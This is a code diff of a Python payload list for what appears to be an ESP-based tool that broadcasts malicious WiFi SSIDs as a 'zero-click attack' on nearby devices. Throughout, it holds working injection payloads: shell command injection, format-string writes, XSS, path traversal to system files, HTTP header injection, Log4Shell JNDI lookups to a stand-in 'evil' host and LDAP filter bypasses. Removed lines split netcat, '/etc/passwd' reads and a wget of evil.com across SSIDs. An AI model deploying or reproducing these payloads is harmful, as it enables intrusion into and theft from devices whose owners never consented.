@@ -36,7 +36,7 @@ CREATE TABLE IF NOT EXISTS serial_log (
 
 DEFAULT_PAYLOADS = [
     # =========================================================================
-    # WIFI SSID — Command Injection (20 payloads)
+    # WIFI SSID, Command Injection (20 payloads)
     # Core zero-click attack: SSID parsed as shell input by vulnerable firmware
     # =========================================================================
     ('|reboot|',             'wifi_cmd',  'Pipe operator reboot'),
@@ -61,15 +61,10 @@ DEFAULT_PAYLOADS = [
     ('\x00|reboot|',         'wifi_cmd',  'Null-prefix command injection'),
 
     # =========================================================================
-    # WIFI SSID — Overflow / Fuzzing (26 payloads)
-    # SSID max is 32 bytes per IEEE 802.11 — test parser boundary handling
-    # NOTE: WiFi.softAP() enforces the 32-byte limit. Payloads >32 bytes are
-    # truncated by the ESP WiFi driver. They are included for completeness and
-    # for use with raw frame injection (esp_wifi_80211_tx) in future firmware.
-    # The 32-byte payloads below are the ones actively broadcast as-is.
+    # WIFI SSID, Overflow / Fuzzing (10 payloads)
+    # SSID max is 32 bytes per IEEE 802.11. WiFi.softAP() enforces this limit,
+    # so payloads here all fit in the broadcast frame as-is.
     # =========================================================================
-
-    # --- 32-byte boundary (IEEE 802.11 SSID max) ---
     ('A' * 32,               'wifi_overflow',  '32-byte max SSID fill'),
     ('A' * 31 + '\x00',     'wifi_overflow',  'Null-terminated at boundary'),
     ('\x7f' * 32,            'wifi_overflow',  '0x7F DEL fill (32 bytes, single-byte safe)'),
@@ -81,29 +76,8 @@ DEFAULT_PAYLOADS = [
     ('\x01' * 32,            'wifi_overflow',  'SOH control byte fill (32 bytes)'),
     ('A' * 31 + '\x7f',     'wifi_overflow',  'DEL char at boundary'),
 
-    # --- 64-byte boundary (common embedded buffer: char ssid[64]) ---
-    ('A' * 64,               'wifi_overflow',  '64-byte buffer fill'),
-    ('A' * 63 + '\x00',     'wifi_overflow',  '64-byte null-terminated boundary'),
-    ('\x7f' * 64,            'wifi_overflow',  '64-byte 0x7F DEL fill'),
-    ('\x00' * 64,            'wifi_overflow',  '64-byte all null bytes'),
-    ('A' * 32 + '\x00' * 32, 'wifi_overflow', '64-byte half-null after SSID max'),
-    ('A' * 33,               'wifi_overflow',  '33-byte off-by-one past SSID max'),
-    ('\x41' * 60 + '\r\n\r\n', 'wifi_overflow', '64-byte CRLF at boundary'),
-    ('A' * 48 + '%n' * 8,   'wifi_overflow',  '64-byte overflow + format write'),
-
-    # --- 128-byte boundary (larger buffers: char buf[128], stack frames) ---
-    ('A' * 128,              'wifi_overflow',  '128-byte buffer fill'),
-    ('A' * 127 + '\x00',    'wifi_overflow',  '128-byte null-terminated boundary'),
-    ('\x7f' * 128,           'wifi_overflow',  '128-byte 0x7F DEL fill'),
-    ('\x00' * 128,           'wifi_overflow',  '128-byte all null bytes'),
-    ('A' * 64 + '\x00' * 64, 'wifi_overflow', '128-byte half-null split'),
-    ('A' * 124 + 'DEAD',    'wifi_overflow',  '128-byte fill + canary marker'),
-    ('\x41' * 120 + '\x01\x02\x03\x04\x7f\x7f\x7f\x7f',
-                             'wifi_overflow',  '128-byte sled + address overwrite'),
-    ('A' * 65,               'wifi_overflow',  '65-byte off-by-one past 64-byte buf'),
-
     # =========================================================================
-    # WIFI SSID — Format String (15 payloads)
+    # WIFI SSID, Format String (15 payloads)
     # Targets C/C++ printf-family in firmware that logs/stores SSID via printf
     # =========================================================================
     ('%s%s%s%s%s',           'wifi_fmt',  'String format crash'),
@@ -123,7 +97,7 @@ DEFAULT_PAYLOADS = [
     ('%c' * 32,              'wifi_fmt',  'Char format stack dump'),
 
     # =========================================================================
-    # WIFI SSID — Probe/Deauth (10 payloads)
+    # WIFI SSID, Probe/Deauth (10 payloads)
     # Malformed SSIDs targeting WiFi stack parsing (802.11 frame handling)
     # =========================================================================
     ('',                     'wifi_probe',  'Empty SSID (hidden network)'),
@@ -138,7 +112,7 @@ DEFAULT_PAYLOADS = [
     ('\\\\\\\\\\\\\\\\',    'wifi_probe',  'Escape sequence flood'),
 
     # =========================================================================
-    # ADVANCED — Terminal/Log Escape Injection (8 payloads)
+    # ADVANCED, Terminal/Log Escape Injection (8 payloads)
     # SSID logged to serial/syslog/terminal → ANSI codes execute in viewer
     # Novel: no public SSID research targets terminal escape injection
     # =========================================================================
@@ -152,7 +126,7 @@ DEFAULT_PAYLOADS = [
     ('\x1b[8mHIDDEN_PAYLOAD',        'wifi_esc',  'Hidden text mode (invisible in logs)'),
 
     # =========================================================================
-    # ADVANCED — Serialization/Config Injection (8 payloads)
+    # ADVANCED, Serialization/Config Injection (8 payloads)
     # IoT firmware stores SSIDs in JSON/XML/INI/SQLite config files
     # Novel: targets data-at-rest parsing, not runtime shell execution
     # =========================================================================
@@ -166,7 +140,7 @@ DEFAULT_PAYLOADS = [
     ('${7*7}',                       'wifi_serial',  'SSTI expression evaluation'),
 
     # =========================================================================
-    # ADVANCED — Encoding & Normalization Attacks (8 payloads)
+    # ADVANCED, Encoding & Normalization Attacks (8 payloads)
     # Unicode fullwidth chars normalize to ASCII shell metacharacters
     # Novel: bypasses ASCII-only input filters via Unicode normalization
     # =========================================================================
@@ -180,39 +154,24 @@ DEFAULT_PAYLOADS = [
     ('\xc0\xafreboot',               'wifi_enc',  'Overlong UTF-8 slash (path bypass)'),
 
     # =========================================================================
-    # ADVANCED — Multi-SSID Chain Attacks (8 payloads)
-    # Individual SSIDs look harmless; consecutive SSIDs form complete payload
-    # Novel: exploits scan-result concatenation in device WiFi managers
-    # Pairs: odd=part1, even=part2 (broadcast sequentially)
-    # =========================================================================
-    ('$(cat /et',                    'wifi_chain',  'Chain 1/2: split subshell open'),
-    ('c/passwd)',                     'wifi_chain',  'Chain 2/2: split subshell close'),
-    ('|nc 10.0.',                    'wifi_chain',  'Chain 1/2: split netcat addr'),
-    ('0.1 4444|',                    'wifi_chain',  'Chain 2/2: split netcat port'),
-    ('%s%s%s%s',                     'wifi_chain',  'Chain 1/2: format leak phase'),
-    ('%n%n%n%n',                     'wifi_chain',  'Chain 2/2: format write phase'),
-    ('; wget http:/',                'wifi_chain',  'Chain 1/2: split wget URL'),
-    ('/evil.com/x ;',                'wifi_chain',  'Chain 2/2: split wget exec'),
-
-    # =========================================================================
-    # ADVANCED — Memory Corruption Primitives (8 payloads)
-    # Byte patterns targeting heap/stack metadata in embedded allocators
-    # Novel: not generic fuzzing — targets dlmalloc/newlib used by ESP
+    # WIFI SSID, Byte-Pattern Fuzzing (8 payloads)
+    # 32-byte repeating patterns and debug-allocator markers. Useful for
+    # finding parser faults, these are fuzz inputs, not exploit primitives.
     # =========================================================================
     ('\x41' * 4 + '\x7f' * 4 + '\x41' * 4 + '\x7f' * 4 + '\x41' * 4 + '\x7f' * 4 + '\x41' * 4 + '\x7f' * 4,
-                                     'wifi_heap',  'dlmalloc prev_size overwrite pattern (32 bytes)'),
-    ('\x00\x00\x00\x04' * 8,        'wifi_heap',  'Fake chunk size=4 (32 bytes, minimum alloc)'),
-    ('DEADBEEF' * 4,                 'wifi_heap',  'DEADBEEF canary detection probe (32 bytes)'),
-    ('\x01\x00\x00\x00' * 8,        'wifi_heap',  'Integer 1 spray (32 bytes, bool confusion)'),
-    ('\x01\x01\x01\x7f' * 8,        'wifi_heap',  'Near-max byte spray (32 bytes, overflow probe)'),
-    ('\x00' * 28 + '\x41\x41\x41\x41', 'wifi_heap', 'Null sled + return addr overwrite (32 bytes)'),
-    ('BAADF00D' * 4,                 'wifi_heap',  'BAADF00D uninitialized mem marker (32 bytes)'),
+                                     'wifi_fuzz',  'Alternating high/low byte pattern fuzz (32B)'),
+    ('\x00\x00\x00\x04' * 8,        'wifi_fuzz',  'Repeating small-int pattern fuzz (32B)'),
+    ('DEADBEEF' * 4,                 'wifi_fuzz',  'DEADBEEF marker fuzz (32B), visible in memory dumps'),
+    ('\x01\x00\x00\x00' * 8,        'wifi_fuzz',  'Repeating int-1 pattern fuzz (32B)'),
+    ('\x01\x01\x01\x7f' * 8,        'wifi_fuzz',  'Near-max-byte pattern fuzz (32B)'),
+    ('\x00' * 28 + '\x41\x41\x41\x41', 'wifi_fuzz', 'Null-sled + ASCII tail fuzz (32B)'),
+    ('BAADF00D' * 4,                 'wifi_fuzz',  'BAADF00D marker fuzz (32B), debug-allocator marker'),
     ('\x41\x41\x41\x41' * 7 + '\x7e\x7f\x7e\x7f',
-                                     'wifi_heap',  'Heap spray + boundary trigger (32 bytes)'),
+                                     'wifi_fuzz',  'Repeating ASCII + boundary byte fuzz (32B)'),
 
     # =========================================================================
-    # WIFI SSID — XSS / Web UI Injection (8 payloads)
-    # IoT web dashboards display nearby SSIDs — unsanitized = XSS
+    # WIFI SSID, XSS / Web UI Injection (8 payloads)
+    # IoT web dashboards display nearby SSIDs, unsanitized = XSS
     # Targets: router admin panels, smart home hubs, WiFi survey tools
     # =========================================================================
     ('<script>alert(1)</script>',     'wifi_xss',  'Basic reflected XSS in scan results'),
@@ -225,7 +184,7 @@ DEFAULT_PAYLOADS = [
     ('<marquee onstart=alert(1)>',    'wifi_xss',  'Marquee event handler XSS'),
 
     # =========================================================================
-    # WIFI SSID — Path Traversal (6 payloads)
+    # WIFI SSID, Path Traversal (6 payloads)
     # Firmware using SSID in file paths (log storage, config, history)
     # Targets: embedded Linux IoT storing WiFi scan results on filesystem
     # =========================================================================
@@ -237,7 +196,7 @@ DEFAULT_PAYLOADS = [
     ('/dev/urandom',                  'wifi_path',  'Device file read DoS'),
 
     # =========================================================================
-    # WIFI SSID — CRLF / HTTP Header Injection (6 payloads)
+    # WIFI SSID, CRLF / HTTP Header Injection (6 payloads)
     # IoT web interfaces reflecting SSID in HTTP responses without CR/LF strip
     # Targets: captive portals, router web UIs, IoT dashboards
     # =========================================================================
@@ -249,9 +208,9 @@ DEFAULT_PAYLOADS = [
     ('\r\nContent-Length: 0',         'wifi_crlf',  'Content-Length header injection'),
 
     # =========================================================================
-    # WIFI SSID — JNDI / Expression Language (6 payloads)
+    # WIFI SSID, JNDI / Expression Language (6 payloads)
     # Java-based IoT platforms that log SSIDs (Android, SmartThings, etc.)
-    # Targets: Log4j, Spring EL, Thymeleaf — any Java logger ingesting SSIDs
+    # Targets: Log4j, Spring EL, Thymeleaf, any Java logger ingesting SSIDs
     # =========================================================================
     ('${jndi:ldap://evil/a}',         'wifi_jndi',  'Log4Shell JNDI LDAP lookup'),
     ('${jndi:dns://evil/a}',          'wifi_jndi',  'JNDI DNS exfiltration'),
@@ -261,7 +220,7 @@ DEFAULT_PAYLOADS = [
     ('${{<%[%\'"}}%\\.',              'wifi_jndi',  'Polyglot template probe'),
 
     # =========================================================================
-    # WIFI SSID — NoSQL / LDAP Injection (6 payloads)
+    # WIFI SSID, NoSQL / LDAP Injection (6 payloads)
     # IoT devices using MongoDB/CouchDB or LDAP for network storage/auth
     # Targets: enterprise IoT, network appliances, cloud-connected devices
     # =========================================================================
@@ -273,7 +232,7 @@ DEFAULT_PAYLOADS = [
     ('admin)(|(password=*',           'wifi_nosql',  'LDAP password filter bypass'),
 
     # =========================================================================
-    # Additions to existing categories — filling gaps
+    # Additions to existing categories, filling gaps
     # =========================================================================
 
     # --- Command Injection: Windows/BusyBox/PowerShell targets ---
